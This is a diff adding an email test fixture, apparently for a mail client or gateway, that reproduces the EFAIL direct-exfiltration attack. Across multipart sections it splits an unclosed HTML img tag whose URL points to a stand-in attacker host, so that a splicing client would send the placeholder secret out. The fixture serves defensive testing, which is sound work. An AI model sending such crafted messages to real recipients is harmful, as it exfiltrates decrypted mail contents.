@@ -1,0 +1,33 @@
+From: "Fixture Lab" <attacker@example.test>
+To: "Gateway Test User" <victim@example.test>
+Date: Mon, 08 Jun 2026 12:00:00 +0000
+Message-ID: <fixture-03-pgp-efail-direct.client-fixtures@example.test>
+Subject: PGP EFAIL direct: the calendar tried to be an image
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="pgp-direct-splice"
+
+--pgp-direct-splice
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+<!doctype html>
+<html>
+  <body>
+    <p>The next tag is intentionally unfinished unless the client splices sibling parts.</p>
+    <img alt="calendar syrup" src="http://attacker.example.test:8080/pgp-efail-direct/
+--pgp-direct-splice
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+SECRET_PANCAKE_MINUTES_1337
+--pgp-direct-splice
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+">
+  </body>
+</html>
+--pgp-direct-splice--
